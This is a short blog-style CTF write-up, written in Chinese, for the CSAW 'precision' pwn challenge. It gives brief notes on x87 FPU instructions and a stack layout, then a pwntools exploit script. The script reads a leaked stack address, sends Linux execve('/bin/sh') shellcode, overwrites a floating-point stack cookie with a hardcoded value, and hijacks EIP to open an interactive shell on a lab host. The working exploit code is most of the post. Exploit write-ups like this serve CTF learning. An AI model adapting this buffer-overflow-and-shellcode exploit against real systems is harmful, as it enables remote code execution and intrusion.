---
layout: post
title: "csaw_precition"
date: 2015-09-23 00:47:01 +0800
comments: true
categories: 
---

0x00 pre
fld是将浮点数字传入fpu寄存器
FST 指令将 ST(0) 寄存器中的值复制到目标操作数
FSTP 指令先执行同 FST 指令相同的操作，然后弹出寄存器堆栈
FUCOMIP比较大小，结果放在EFLAGS

0x01 anaylasis

	buf --- esp+18
	shellcode
	junk
	cookie --- esp+98
	junk
	junk_ebp
	eip ----- v4


0x02 exp

	from pwn import *
	from binascii import *

	#r = process('./precision')
	r = remote('192.168.56.102', 6666)


	cookie = '\xa5\x31\x5a\x47\x55\x15\x50\x40'
	#cookie = 'cccccccc'
	data = r.recv(16)
	v4 = int(data[8:17], 16)
	print data
	print data[8:17]
	print hex(v4)
	payload  = ''
	payload= "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\x40\x40\x40\x40\x40\x40\x40\x40\x40
	\x40\x40\xcd\x80"


	payload += 'a'*(0x80 - len(payload))
	payload += cookie
	payload += 'bbbbccccdddd'
	payload += p32(v4)
	print b2a_hex(payload)

	r.sendline(payload)


	r.interactive()


        

